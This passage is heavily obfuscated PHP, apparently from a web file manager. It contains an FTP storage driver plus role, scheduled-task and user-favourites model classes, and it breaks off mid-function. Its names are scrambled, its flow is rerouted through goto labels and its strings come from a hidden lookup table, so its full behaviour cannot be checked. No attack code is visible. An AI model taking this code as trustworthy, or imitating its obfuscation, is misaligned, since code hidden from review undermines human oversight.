fileInfo($bÄƒ³òŠ¤¾, $A…… ¹Ÿ = false) { goto bÍÙÎÔ¬¼; aîôë„ßù¨: $D®º£¾¤¦ò = $this->iconvSystem($bÄƒ³òŠ¤¾); if ($A…… ¹Ÿ) { return array($fÃœÑà´†[28] => $bº–§÷ ¿Ì, $fÃœÑà´†[75] => $cß½ÛÔ÷É‡, $fÃœÑà´†[29] => $fÃœÑà´†[167], $fÃœÑà´†[160] => $this->ext($bÄƒ³òŠ¤¾), $fÃœÑà´†[77] => $this->size($bÄƒ³òŠ¤¾)); } $FÊÉ±ÜÄî™ = array($fÃœÑà´†[28] => $bº–§÷ ¿Ì, $fÃœÑà´†[75] => $cß½ÛÔ÷É‡, $fÃœÑà´†[29] => $fÃœÑà´†[167], $fÃœÑà´†[187] => 0, $fÃœÑà´†[107] => @ftp_mdtm($this->connect, $D®º£¾¤¦ò), $fÃœÑà´†[160] => $this->ext($bÄƒ³òŠ¤¾), $fÃœÑà´†[77] => $this->size($bÄƒ³òŠ¤¾), $fÃœÑà´†[1161] => !0, $fÃœÑà´†[1162] => !0); goto BÆÙ‚õ¬çì; bÍÙÎÔ¬¼: $fÃœÑà´† =& $_SERVER[Æ]; $cß½ÛÔ÷É‡ = $this->getPathOuter(rtrim($bÄƒ³òŠ¤¾, $fÃœÑà´†[8])); $bº–§÷ ¿Ì = $this->pathThis($cß½ÛÔ÷É‡); goto aîôë„ßù¨; BÆÙ‚õ¬çì: $FÊÉ±ÜÄî™[$fÃœÑà´†[107]] = $FÊÉ±ÜÄî™[$fÃœÑà´†[107]] > 0 ? $FÊÉ±ÜÄî™[$fÃœÑà´†[107]] : 0; return $FÊÉ±ÜÄî™; goto BÑÕˆ‡ ì‹; BÑÕˆ‡ ì‹: } public function size($AÏÓÏã£ô) { $EÖ¯ˆ²À¬Ğ = $this->objectMeta($AÏÓÏã£ô); return $EÖ¯ˆ²À¬Ğ ? $EÖ¯ˆ²À¬Ğ[$_SERVER[Æ][77]] : 0; } public function info($cäÖ¤¬Æä™) { if ($this->isFile($cäÖ¤¬Æä™)) { return $this->fileInfo($cäÖ¤¬Æä™, 0); } else { if ($this->isFolder($cäÖ¤¬Æä™)) { return $this->folderInfo($cäÖ¤¬Æä™); } } return !1; } public function exist($D–÷‘¸¢ˆğ) { return $this->objectMeta($D–÷‘¸¢ˆğ) ? !0 : !1; } public function isFile($c•½Ô»š©) { $fÌ¤ãµ•¯ =& $_SERVER[Æ]; $aÜÓ¤Æºè½ = $this->objectMeta($c•½Ô»š©); return $aÜÓ¤Æºè½ ? $aÜÓ¤Æºè½[$fÌ¤ãµ•¯[29]] == $fÌ¤ãµ•¯[167] : !1; } public function isFolder($B‹è¤Ë–Á») { $däŞ‘ä½›Â =& $_SERVER[Æ]; $aƒ…Ê½¢ã = $this->objectMeta($B‹è¤Ë–Á»); return $aƒ…Ê½¢ã ? $aƒ…Ê½¢ã[$däŞ‘ä½›Â[29]] == $däŞ‘ä½›Â[76] : !1; } public function listPath($AìİÎ©÷ë, $BêÉ‡·Ü¤Ù = false) { goto dßƒÛ“®·‘; dßƒÛ“®·‘: $aÏ¬øô„Æ =& $_SERVER[Æ]; if (!$this->_isconn()) { return !1; } $AìİÎ©÷ë = $this->iconvSystem($AìİÎ©÷ë); goto C¯ ôÃ…Ğ¹; C¯ ôÃ…Ğ¹: $eÌÔôù›Ò = $this->ftpList($AìİÎ©÷ë); $A£¬ì‚ó÷Ù = array($aÏ¬øô„Æ[74] => array(), $aÏ¬øô„Æ[73] => array()); if (!$eÌÔôù›Ò) { return $A£¬ì‚ó÷Ù; } goto f½…ÃÂÌí; f½…ÃÂÌí: foreach ($eÌÔôù›Ò as $AìİÎ©÷ë) { if ($this->isFolder($AìİÎ©÷ë)) { $A£¬ì‚ó÷Ù[$aÏ¬øô„Æ[74]][] = $this->folderInfo($AìİÎ©÷ë, $BêÉ‡·Ü¤Ù); } else { $A£¬ì‚ó÷Ù[$aÏ¬øô„Æ[73]][] = $this->fileInfo($AìİÎ©÷ë, $BêÉ‡·Ü¤Ù); } } return $A£¬ì‚ó÷Ù; goto AÃÌ‹Õ¦¨œ; AÃÌ‹Õ¦¨œ: } public function has($CÂ‚©ŸØ³“, $f‘ÖÀ«ŸòÎ = false, $B‹°İÁßÛÊ = true) { goto dø­ùÁ‹‹Ğ; dø­ùÁ‹‹Ğ: $f‘Šïİ­Î› =& $_SERVER[Æ]; if (!$this->_isconn()) { return !1; } $CÂ‚©ŸØ³“ = $this->iconvSystem($CÂ‚©ŸØ³“); goto f‰¾ŒïŠÉ›; f‰¾ŒïŠÉ›: $aê§Ê£”ç = $this->ftpList($CÂ‚©ŸØ³“); if (!$aê§Ê£”ç) { return !1; } if ($f‘ÖÀ«ŸòÎ) { return array($f‘Šïİ­Î›[191] => 0, $f‘Šïİ­Î›[192] => count($aê§Ê£”ç)); } goto C•öòÕŸğÃ; C•öòÕŸğÃ: foreach ($aê§Ê£”ç as $CÂ‚©ŸØ³“) { if ($B‹°İÁßÛÊ) { if (!$this->isFolder($CÂ‚©ŸØ³“)) { return !0; } } else { if ($this->isFolder($CÂ‚©ŸØ³“)) { return !0; } } } return !1; goto FÊ–áˆîÊä; FÊ–áˆîÊä: } public function listAll($F»™º–§Ê) { goto fìÔ¸¥ïğª; Bš¹‡¸àØÛ: foreach ($c‡ñ¸—¢ï[$Cªè„™–‚š[74]] as $FÍ¼¦Ù°ĞĞ) { $dÖöÒÇÜ±’[] = array($Cªè„™–‚š[75] => $Cªè„™–‚š[8] . trim(str_replace($F»™º–§Ê, $Cªè„™–‚š[33], $FÍ¼¦Ù°ĞĞ), $Cªè„™–‚š[8]) . $Cªè„™–‚š[8], $Cªè„™–‚š[76] => 1, $Cªè„™–‚š[77] => 0); } foreach ($c‡ñ¸—¢ï[$Cªè„™–‚š[73]] as $b’‰‘õŒÛ) { $dÖöÒÇÜ±’[] = array($Cªè„™–‚š[75] => $Cªè„™–‚š[8] . trim(str_replace($F»™º–§Ê, $Cªè„™–‚š[33], $b’‰‘õŒÛ), $Cªè„™–‚š[8]), $Cªè„™–‚š[76] => 0, $Cªè„™–‚š[77] => $this->size($b’‰‘õŒÛ)); } return $dÖöÒÇÜ±’; goto CğÁš™ÛÃÙ; fìÔ¸¥ïğª: $Cªè„™–‚š =& $_SERVER[Æ]; if (!$this->_isconn()) { return !1; } $F»™º–§Ê = $this->iconvSystem($F»™º–§Ê); goto DîÙÎ£…¢«; DîÙÎ£…¢«: $c‡ñ¸—¢ï = array($Cªè„™–‚š[73] => array(), $Cªè„™–‚š[74] => array()); $this->recursionFtpFiles($F»™º–§Ê, $c‡ñ¸—¢ï); $dÖöÒÇÜ±’ = array(); goto Bš¹‡¸àØÛ; CğÁš™ÛÃÙ: } public function getContent($A÷é®ï½‘­) { if (!$this->_isconn()) { return !1; } $A÷é®ï½‘­ = $this->iconvSystem($A÷é®ï½‘­); return $this->fileSubstr($A÷é®ï½‘­); } public function setContent($a‰ùİ˜—‹, $F·Ä‘İ¬Ê = '') { goto E©Ã…–ä¬; A Îƒ‘Âèâ: return $eƒêßÖŠíæ; goto B°Å‘Ç‘±; E©Ã…–ä¬: if (!$this->_isconn()) { return !1; } $Bâ²ğ´â±´ = $this->pathThis($this->iconvSystem($a‰ùİ˜—‹)); $FÍ™ŒÀ = $this->tempFile($Bâ²ğ´â±´); goto FÄ™½°Û; FÄ™½°Û: file_put_contents($FÍ™ŒÀ, $F·Ä‘İ¬Ê); $eƒêßÖŠíæ = $this->upload($a‰ùİ˜—‹, $this->iconvApp($FÍ™ŒÀ)); $this->tempFileRemve($FÍ™ŒÀ); goto A Îƒ‘Âèâ; B°Å‘Ç‘±: } public function fileSubstr($d›‰®ôÓ¿‰, $aôì¹‡°¿æ = 0, $cğÕì¹áƒ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($d›‰®ôÓ¿‰, $aôì¹‡°¿æ, $cğÕì¹áƒ); } private function ftpRequest($Cè—òğ¥Àó, $eŸ•Ÿ–° = 0, $f‡çœ˜³É = false) { goto cšøŠç˜¶Ğ; cšøŠç˜¶Ğ: $Cè—òğ¥Àó = $this->iconvSystem($Cè—òğ¥Àó); $bêºßšÎ = $this->scheme . $this->host . $_SERVER[Æ][4] . $this->port; $BïŞºÉÉÛ¨ = curl_init(); goto c­Ÿç•¾³¡; Bô£õŸ…ƒ: curl_setopt($BïŞºÉÉÛ¨, CURLOPT_RETURNTRANSFER, 1); $CÓ¨¹¿™ĞŠ = curl_exec($BïŞºÉÉÛ¨); curl_close($BïŞºÉÉÛ¨); goto a©ïáÉ‚õõ; a©ïáÉ‚õõ: return $CÓ¨¹¿™ĞŠ; goto b¤ÆÁ«¾ß„; c­Ÿç•¾³¡: curl_setopt($BïŞºÉÉÛ¨, CURLOPT_URL, $bêºßšÎ . $this->pathEncode($Cè—òğ¥Àó)); curl_setopt($BïŞºÉÉÛ¨, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($f‡çœ˜³É) { $d¼Ü†­»ŞÏ = $eŸ•Ÿ–° + $f‡çœ˜³É - 1; curl_setopt($BïŞºÉÉÛ¨, CURLOPT_RANGE, "{$eŸ•Ÿ–°}\55{$d¼Ü†­»ŞÏ}"); } goto Bô£õŸ…ƒ; b¤ÆÁ«¾ß„: } public function upload($CÔÎ„ ’¥Ş, $dÑ”“ù³®, $Cøãğ·ŠĞ” = false, $d„Á÷İ£˜ = REPEAT_REPLACE) { goto f½¯‘Š‘À°; C†¿ªõ›À: $dÑ”“ù³® = $this->iconvSystem($dÑ”“ù³®); $Bòò´Éçôã = ftp_nb_put($this->connect, $CÔÎ„ ’¥Ş, $dÑ”“ù³®, FTP_BINARY); while ($Bòò´Éçôã == FTP_MOREDATA) { $Bòò´Éçôã = ftp_nb_continue($this->connect); } goto BÖí¤êĞ‰; BÖí¤êĞ‰: if ($Bòò´Éçôã != FTP_FINISHED) { return !1; } return $this->getPathOuter($CÔÎ„ ’¥Ş); goto CãÌ¹²„ƒĞ; f½¯‘Š‘À°: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($CÔÎ„ ’¥Ş))) { return !1; } $CÔÎ„ ’¥Ş = $this->iconvSystem($CÔÎ„ ’¥Ş); goto C†¿ªõ›À; CãÌ¹²„ƒĞ: } public function download($b…»¢ĞÛºŠ, $a“âÈá‚Œò = '') { goto D·×±¦ÀšØ; cØ“å‹×•: $b…»¢ĞÛºŠ = $this->iconvSystem($b…»¢ĞÛºŠ); $a“âÈá‚Œò = $this->iconvSystem($a“âÈá‚Œò); $eî«ŸÒòò = ftp_nb_get($this->connect, $a“âÈá‚Œò, $b…»¢ĞÛºŠ, FTP_BINARY); goto D£ï¦Öî‹; D£ï¦Öî‹: while ($eî«ŸÒòò == FTP_MOREDATA) { $eî«ŸÒòò = ftp_nb_continue($this->connect); } if ($eî«ŸÒòò != FTP_FINISHED) { return !1; } return $this->iconvApp($a“âÈá‚Œò); goto a©«Šøå·¡; D·×±¦ÀšØ: if (!$this->_isconn()) { return !1; } $E¶ˆÅÚÂ = $this->pathFather($a“âÈá‚Œò); if (!IO::mkdir($E¶ˆÅÚÂ)) { return !1; } goto cØ“å‹×•; a©«Šøå·¡: } private function ftpList($bß¡ÂŸåó…) { goto bä¾ÇñŸâ; Bá¦¨ÙÙ‚: $d‹ËåÆšî¦ = array(); foreach ($BÔ¥‰Õ› as $FÙÎ¥¸ì‘) { if ($FÙÎ¥¸ì‘ == $A± …Ì£™µ[91] || $FÙÎ¥¸ì‘ == $A± …Ì£™µ[1164]) { continue; } if (!strstr($FÙÎ¥¸ì‘, $A± …Ì£™µ[8])) { $FÙÎ¥¸ì‘ = $bß¡ÂŸåó… . ltrim($FÙÎ¥¸ì‘, $A± …Ì£™µ[8]); } $d‹ËåÆšî¦[] = $this->iconvApp($FÙÎ¥¸ì‘); } return $d‹ËåÆšî¦; goto FºŒªŸìÃÆ; bä¾ÇñŸâ: $A± …Ì£™µ =& $_SERVER[Æ]; if (!$this->isFolder($bß¡ÂŸåó…)) { return !1; } @ftp_chdir($this->connect, $A± …Ì£™µ[8]); goto f“¶›Ü; f“¶›Ü: $bß¡ÂŸåó… = rtrim($bß¡ÂŸåó…, $A± …Ì£™µ[8]) . $A± …Ì£™µ[8]; $BÔ¥‰Õ› = @ftp_nlist($this->connect, $bß¡ÂŸåó…); if ($BÔ¥‰Õ› === !1) { $BÔ¥‰Õ› = @ftp_rawlist($this->connect, $bß¡ÂŸåó…); foreach ($BÔ¥‰Õ› as $B¯ÊˆØÔ“™ => $Fãœ“µ¦) { $BÔ¥‰Õ›[$B¯ÊˆØÔ“™] = end(explode($A± …Ì£™µ[1163], $Fãœ“µ¦)); } } goto Bá¦¨ÙÙ‚; FºŒªŸìÃÆ: } private function recursionFtpFiles($E˜ÑæÉŠİ÷, &$E‚Æ‚¾šÑ) { $féˆÁôˆâ† =& $_SERVER[Æ]; if (!$this->_isconn()) { return !1; } if (!($f¦ºá„‹› = $this->ftpList($E˜ÑæÉŠİ÷))) { return !1; } foreach ($f¦ºá„‹› as $E˜ÑæÉŠİ÷) { if ($this->isFolder($E˜ÑæÉŠİ÷)) { $this->recursionFtpFiles($E˜ÑæÉŠİ÷, $E‚Æ‚¾šÑ); $E‚Æ‚¾šÑ[$féˆÁôˆâ†[74]][] = $E˜ÑæÉŠİ÷; } else { $E‚Æ‚¾šÑ[$féˆÁôˆâ†[73]][] = $E˜ÑæÉŠİ÷; } } } private function objectMeta($b­éÉÃçá£) { goto fÕ–ó¯˜ğ²; fÕ–ó¯˜ğ²: $C„¯ÈÛšç =& $_SERVER[Æ]; $C«Ô…‰ÃÜö = $C„¯ÈÛšç[1165] . md5($b­éÉÃçá£); $bîá°İ = Cache::get($C«Ô…‰ÃÜö); goto cî–İÍŸ¢; cî–İÍŸ¢: if ($bîá°İ !== null && $bîá°İ !== !1) { return $bîá°İ; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $C„¯ÈÛšç[8]); goto Aòİ»œŒ–É; Aòİ»œŒ–É: $CÍ—“É¯êÅ = @ftp_size($this->connect, $this->iconvSystem($b­éÉÃçá£)); if ($CÍ—“É¯êÅ != -1) { $bîá°İ = array($C„¯ÈÛšç[77] => $CÍ—“É¯êÅ, $C„¯ÈÛšç[29] => $C„¯ÈÛšç[167]); } else { $EÏ¤º«âßÀ = @ftp_chdir($this->connect, $this->iconvSystem($b­éÉÃçá£)); $bîá°İ = $EÏ¤º«âßÀ ? array($C„¯ÈÛšç[77] => 0, $C„¯ÈÛšç[29] => $C„¯ÈÛšç[76]) : !1; } Cache::set($C«Ô…‰ÃÜö, $bîá°İ, 0); goto EšéÖÏ°Âá; EšéÖÏ°Âá: return $bîá°İ; goto Bà„Æ×¡„; Bà„Æ×¡„: } } goto b—ÊóÍÀÜ‡; F‘ó£«…É™: register_shutdown_function($_SERVER[ş”][36]); set_error_handler($_SERVER[ş”][49], $eˆŞ¢ÅË¡†); if (function_exists($_SERVER[ş”][50])) { set_exception_handler($_SERVER[ş”][51]); } goto cÔÒ¹â…Š’; Cšâğì˜¡ : define($_SERVER[Æ][1930], 2); define($_SERVER[Æ][1931], 3); define($_SERVER[Æ][1932], 4); goto f…™®šÑÎ; FøÔ¢–‹Ì¬: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\x72\157\154\x65\x4c\x69\x73\164"; public $field = array("\x6e\141\155\145", "\141\165\164\x68", "\x6c\141\142\x65\x6c", "\x64\x69\163\x70\x6c\141\x79", "\163\x79\163\x74\145\x6d", "\144\145\163\143", "\151\x67\156\157\162\x65\x45\170\164", "\x69\x67\x6e\157\x72\x65\106\x69\154\x65\x53\x69\x7a\145", "\x61\x64\x6d\x69\156\x69\x73\x74\x72\141\x74\x6f\162", "\x73\157\162\164"); public function listData($C‚ö²¹ÅÍ¸ = false, $dê–…¾‹ï  = "\x73\x6f\x72\x74", $B§‡…ä×¶è = false) { $CÉèÃ“îõ¨ =& $_SERVER[Æ]; $B÷Œ‹²íÑÁ = parent::listData($C‚ö²¹ÅÍ¸, $dê–…¾‹ï , $B§‡…ä×¶è); if (!$C‚ö²¹ÅÍ¸) { $eäƒˆ Á…÷ = $CÉèÃ“îõ¨[2480]; foreach ($B÷Œ‹²íÑÁ as $c™¬¼¦‚ëö => $dÆ¯‡ŠøİÔ) { if ($dÆ¯‡ŠøİÔ[$CÉèÃ“îõ¨[2481]] == 1) { $B÷Œ‹²íÑÁ[$c™¬¼¦‚ëö][$CÉèÃ“îõ¨[405]] = $eäƒˆ Á…÷; } } } return $B÷Œ‹²íÑÁ; } public function update($EĞÖ·£›à¼, $aà¥ãµñŞö) { goto E´£›ö—±ª; C±Ò‰°è»: if (!$c¦ÜƒÎâù• || $BÂ¦Í¼‡íã && $BÂ¦Í¼‡íã[$B¶î×ìõò‹[367]] != $c¦ÜƒÎâù•[$B¶î×ìõò‹[367]]) { return !1; } if ($BÂ¦Í¼‡íã[$B¶î×ìõò‹[2481]] == 1) { $aà¥ãµñŞö = array($B¶î×ìõò‹[28] => $aà¥ãµñŞö[$B¶î×ìõò‹[28]], $B¶î×ìõò‹[2119] => $aà¥ãµñŞö[$B¶î×ìõò‹[2119]]); } $this->filterAuth($aà¥ãµñŞö[$B¶î×ìõò‹[376]]); goto e›ÙÅĞ´£Ü; E´£›ö—±ª: $B¶î×ìõò‹ =& $_SERVER[Æ]; $c¦ÜƒÎâù• = parent::listData($EĞÖ·£›à¼); $BÂ¦Í¼‡íã = $this->findByName($aà¥ãµñŞö[$B¶î×ìõò‹[28]]); goto C±Ò‰°è»; e›ÙÅĞ´£Ü: return parent::update($EĞÖ·£›à¼, $aà¥ãµñŞö); goto eÑ öØ‘; eÑ öØ‘: } public function remove($EÕñ›Î¨Õ´) { $Aåµ‚Óè¥Â = parent::listData($EÕñ›Î¨Õ´); if (!$Aåµ‚Óè¥Â || $Aåµ‚Óè¥Â[$_SERVER[Æ][1080]]) { return !1; } return parent::remove($EÕñ›Î¨Õ´); } public function add($A”‹Ù˜¼) { goto B¤š´¦­; B¤š´¦­: $EÉó·ÁÔ—ç =& $_SERVER[Æ]; $Fáêô™ôñä = $A”‹Ù˜¼[$EÉó·ÁÔ—ç[28]]; if ($this->findByName($Fáêô™ôñä)) { return !1; } goto bïõÛÚéŒù; bïõÛÚéŒù: $bˆ­ãº²æ = array($EÉó·ÁÔ—ç[386] => $Fáêô™ôñä, $EÉó·ÁÔ—ç[2107] => $EÉó·ÁÔ—ç[33], $EÉó·ÁÔ—ç[2103] => $EÉó·ÁÔ—ç[2120], $EÉó·ÁÔ—ç[2482] => 1, $EÉó·ÁÔ—ç[2106] => 0, $EÉó·ÁÔ—ç[2483] => 0, $EÉó·ÁÔ—ç[2105] => $this->getSort()); $A”‹Ù˜¼ = array_merge($bˆ­ãº²æ, $A”‹Ù˜¼); $this->filterAuth($A”‹Ù˜¼[$EÉó·ÁÔ—ç[376]]); goto cÙ×Ã‹; cÙ×Ã‹: return parent::insert($A”‹Ù˜¼); goto EŠ¹‚Ú¦ŸŸ; EŠ¹‚Ú¦ŸŸ: } private function getSort() { $fµÌŠó„ =& $_SERVER[Æ]; $fõÉ³ùØÛ = parent::listData(); $FÓñÚˆİÓ = array_to_keyvalue($fõÉ³ùØÛ, $fµÌŠó„[33], $fµÌŠó„[2122]); return empty($FÓñÚˆİÓ) ? 0 : max($FÓñÚˆİÓ) + 1; } private function filterAuth(&$aˆ¤Äâ…§×) { $aÛøïñÛâ» =& $_SERVER[Æ]; $f±»„ÖÌ™ = array(); $c«¢é¡Í = array_filter(explode($aÛøïñÛâ»[47], $aˆ¤Äâ…§×)); foreach ($c«¢é¡Í as $aˆ¤Äâ…§×) { $b´ˆæ“÷ãë = explode($aÛøïñÛâ»[91], $aˆ¤Äâ…§×); if ($b´ˆæ“÷ãë[0] == $aÛøïñÛâ»[1781] && $b´ˆæ“÷ãë[1] != $aÛøïñÛâ»[1036]) { $AŒµîï•—† = $b´ˆæ“÷ãë[0] . $aÛøïñÛâ»[91] . $b´ˆæ“÷ãë[1] . $aÛøïñÛâ»[2484]; if (!in_array($AŒµîï•—†, $c«¢é¡Í)) { $f±»„ÖÌ™[] = $AŒµîï•—†; } } $f±»„ÖÌ™[] = $aˆ¤Äâ…§×; } $aˆ¤Äâ…§× = implode($aÛøïñÛâ»[47], $f±»„ÖÌ™); } public function sort($eÇÚ‚Ğ©™, $d×‹ ™²Ã) { return parent::update($eÇÚ‚Ğ©™, $d×‹ ™²Ã); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\164\141\163\153\114\x69\163\x74"; public $field = array("\156\141\155\x65", "\x74\171\x70\145", "\145\166\x65\x6e\x74", "\164\151\x6d\145", "\144\x65\163\143", "\x73\171\x73\x74\x65\x6d", "\x65\156\x61\x62\x6c\x65", "\x6c\141\x73\x74\122\165\x6e", "\163\x6f\162\164"); public function listData($e‚Â“µÕ™„ = false, $Bïİ ¢‡¸ = "\163\x6f\x72\x74", $F§ƒ±£ª‚´ = false) { return parent::listData($e‚Â“µÕ™„, $Bïİ ¢‡¸, $F§ƒ±£ª‚´); } public function add($aèøšºÚõ) { $FÚ“ª÷Óİ‰ =& $_SERVER[Æ]; $B“…†ö‹åº = $this->findByName($aèøšºÚõ[$FÚ“ª÷Óİ‰[28]]); if ($B“…†ö‹åº) { return !1; } $aèøšºÚõ[$FÚ“ª÷Óİ‰[1399]] = 0; $aèøšºÚõ[$FÚ“ª÷Óİ‰[2122]] = $this->getSort(); return parent::insert($aèøšºÚõ); } private function getSort() { $E±ò¾·ªß´ =& $_SERVER[Æ]; $B“á²«Î‚ = parent::listData(); $A¡ÓßŠÜì = array_to_keyvalue($B“á²«Î‚, $E±ò¾·ªß´[33], $E±ò¾·ªß´[2122]); return empty($A¡ÓßŠÜì) ? 0 : max($A¡ÓßŠÜì) + 1; } public function update($B¥ó‘‹‰ ß, $bê”Àå©ˆ•) { $cÛ•Ï¾ßÔ =& $_SERVER[Æ]; $bï¶ÉéùÈ = $this->listData($B¥ó‘‹‰ ß); $aˆ®àí…ë¯ = $this->findByName($bê”Àå©ˆ•[$cÛ•Ï¾ßÔ[28]]); if (!$bï¶ÉéùÈ || $aˆ®àí…ë¯ && $aˆ®àí…ë¯[$cÛ•Ï¾ßÔ[367]] != $bï¶ÉéùÈ[$cÛ•Ï¾ßÔ[367]]) { return !1; } return parent::update($B¥ó‘‹‰ ß, $bê”Àå©ˆ•); } public function remove($bÁÏ¬•—ÇŞ, $b°½Ú†Ñš‰ = false) { $EÍš¡ƒÔŞç =& $_SERVER[Æ]; $d¦½Ø˜éîÉ = $this->listData($bÁÏ¬•—ÇŞ); if (!$d¦½Ø˜éîÉ) { return; } if (!$b°½Ú†Ñš‰ && $d¦½Ø˜éîÉ[$EÍš¡ƒÔŞç[1080]] == $EÍš¡ƒÔŞç[83]) { return !1; } return parent::remove($bÁÏ¬•—ÇŞ); } public function enable($bªÇ‡©Û³, $A ùà‹ÑÔ) { return $this->update($bªÇ‡©Û³, array($_SERVER[Æ][2473] => $A ùà‹ÑÔ)); } public function run($aëË¤æ×µŒ) { return $this->update($aëË¤æ×µŒ, array($_SERVER[Æ][2485] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($C™Î‚¡Â‡›) { $fš‚ù««ç =& $_SERVER[Æ]; return array($fš‚ù««ç[2486] => array(USER_ID, $fš‚ù««ç[2487])); } protected function listData() { $AÔæ¡²òô =& $_SERVER[Æ]; $Fƒ¸÷Ã® = array($AÔæ¡²òô[1425] => USER_ID, $AÔæ¡²òô[436] => 0); $C†Ã˜í‰ = $AÔæ¡²òô[2488]; $cñêŸ‚óŞ = $this->field($C†Ã˜í‰)->where($Fƒ¸÷Ã®)->order($AÔæ¡²òô[2489])->select(); return $cñêŸ‚óŞ ? $cñêŸ‚óŞ : array(); } protected function resetCache() { } protected function listView() { goto b‰ãäÊ«…; c¦íÎãôÑ¼: $d™³ÏÚ­Æ‚ = array($a“ìÁŒœåô[383] => array($a“ìÁŒœåô[384], $BÚ­èÃÍ£Á)); $dñÏÃõóÚ¥ = Model($a“ìÁŒœåô[751])->listSource($d™³ÏÚ­Æ‚, $A¿öø·Ÿš); $dñÏÃõóÚ¥ = array_merge($dñÏÃõóÚ¥[$a“ìÁŒœåô[73]], $dñÏÃõóÚ¥[$a“ìÁŒœåô[74]]); goto CÌ£ÀÎÖŸ; b‰ãäÊ«…: $a“ìÁŒœåô =& $_SERVER[Æ]; $Fõ½ù³²áª = $this->listData(); $E««´õ«’š = array_filter_by_field($Fõ½ù³²áª, $a“ìÁŒœåô[29], $a“ìÁŒœåô[382]); goto C½Û Ñ·; C½Û Ñ·: $BÚ­èÃÍ£Á = array_to_keyvalue($E««´õ«’š, $a“ìÁŒœåô[33], $a“ìÁŒœåô[75]); if (!$BÚ­èÃÍ£Á) { return $Fõ½ù³²áª; } $A¿öø·Ÿš = 2000; goto c¦íÎãôÑ¼; CÌ£ÀÎÖŸ: $dñÏÃõóÚ¥ = array_to_keyvalue($dñÏÃõóÚ¥, $a“ìÁŒœåô[369]); foreach ($Fõ½ù³²áª as $a™áØ®İ => $E¶õ•´Ææ) { $E‡©Ñ·„Üè = $dñÏÃõóÚ¥[$E¶õ•´Ææ[$a“ìÁŒœåô[75]]]; $E‡©Ñ·„Üè = $E‡©Ñ·„Üè ? $E‡©Ñ·„Üè : array(); $Fõ½ù³²áª[$a™áØ®İ] = array_merge($E‡©Ñ·„Üè, $E¶õ•´Ææ); } return $Fõ½ù³²áª; goto c‰É£°¡¹¡; c‰É£°¡¹¡: } protected function addFav($c»´×Œ‘¸…, $BÊó»ÂÚ­ = '', $e¬‚ïŸãÊ = "\163\x6f\165\x72\143\x65") { goto E­‹İ°ìˆ™; D¨âÙ¬É‰‡: $Cî‰À¶‘¬Ì = array($fç‡Èéçø–[1425] => USER_ID, $fç‡Èéçø–[436] => 0); $c³´Íšµ˜» = $this->where($Cî‰À¶‘¬Ì)->max($fç‡Èéçø–[2122]); if (!$c³´Íšµ˜») { $c³´Íšµ˜» = 0; } goto C‹±ñšğ±×; E­‹İ°ìˆ™: $fç‡Èéçø– =& $_SERVER[Æ]; $Cî‰À¶‘¬Ì = array($fç‡Èéçø–[1425] => USER_ID, $fç‡Èéçø–[436] => 0, $fç‡Èéçø–[388] => $e¬‚ïŸãÊ, $fç‡Èéçø–[387] => $c»´×Œ‘¸…); if ($this->where($Cî‰À¶‘¬Ì)->find()) { return !1; } goto D¨âÙ¬É‰‡; C‹±ñšğ±×: if (!$BÊó»ÂÚ­ && $e¬‚ïŸãÊ == $fç‡Èéçø–[382]) { $e¬ÓßĞ·ÁÍ = Model($fç‡Èéçø–[1117])->where(array($fç‡Èéçø–[383] => $c»´×Œ‘¸…))->find(); if (!$e¬ÓßĞ·ÁÍ) { return !1; } $BÊó»ÂÚ­ = $e¬ÓßĞ·ÁÍ[$fç‡Èéçø–[28]]; } $BÊó»ÂÚ­ = $this->getAutoName($BÊó»ÂÚ­); $d²‘©ÛÍ³¥ = array($fç‡Èéçø–[1425] => USER_ID, $fç‡Èéçø–[436] => 0, $fç‡Èéçø–[386] => $BÊó»ÂÚ­, $fç‡Èéçø–[387] => $c»´×Œ‘¸…, $fç‡Èéçø–[388] => $e¬‚ïŸãÊ, $fç‡Èéçø–[2105] => $c³´Íšµ˜» + 1); goto F¼Úé‡¹±; F¼Úé‡¹±: return $this->add($d²‘©ÛÍ³¥); goto dËäš—æÒ; dËäš—æÒ: } protected function remove($B˜´¨¼§) { $FÈ…æàêø =& $_SERVER[Æ]; $d‚×Û×¿¹ = array($FÈ…æàêø[1425] => USER_ID, $FÈ…æàêø[385] => $B˜´¨¼§); return $this->where($d‚×Û×¿¹)->delete(); } protected function removeByName($aí‰´œãÑÍ) { $DõÇÃÄ„Àä =& $_SERVER[Æ]; $eö„¡Û“Õ = array($DõÇÃÄ„Àä[1425] => USER_ID, $DõÇÃÄ„Àä[386] => $aí‰´œãÑÍ, $DõÇÃÄ„Àä[436] => 0); return $this->where($eö„¡Û“Õ)->delete(); } protected function rename($a¢³Ûğ¹µ©, $dá÷óæ«Âƒ) { $d‰ÀÃÎâÀ¤ =& $_SERVER[Æ]; if ($a¢³Ûğ¹µ© == $dá÷óæ«Âƒ) { return !1; } $aÛ‹¹š·í¯ = $this->getAutoName($dá÷óæ«Âƒ); if ($dá÷óæ«Âƒ != $aÛ‹¹š·í¯) { return !1; } $F½­ßö´Å… = array($d‰ÀÃÎâÀ¤[1425] => USER_ID, $d‰ÀÃÎâÀ¤[436] => 0, $d‰ÀÃÎâÀ¤[28] => $a¢³Ûğ¹µ©); return $this->where($F½­ßö´Å…)->save(array($d‰ÀÃÎâÀ¤[28] => $dá÷óæ«Âƒ)); } protected function resetSort($aèÖ†º¯˜Ÿ) { $d˜î×¡ÇÅ =& $_SERVER[Æ]; $aèÖ†º¯˜Ÿ = is_array($aèÖ†º¯˜Ÿ) ? $aèÖ†º¯˜Ÿ : array(); $AÕåØ¤Èº„ = array($d˜î×¡ÇÅ[1425] => USER_ID); for ($A‡Ô…¹ãÀ° = 0; $A‡Ô…¹ãÀ° < count($aèÖ†º¯˜Ÿ); $A‡Ô…¹ãÀ°++) { $AÕåØ¤Èº„[$d˜î×¡ÇÅ[385]] = $aèÖ†º¯˜Ÿ[$A‡Ô…¹ãÀ°]; $this->where($AÕåØ¤Èº„)->save(array($d˜î×¡ÇÅ[2105] => $A‡Ô…¹ãÀ° + 1)); } return !0; } protected function moveTop($b£Œàöè‹ª) { goto 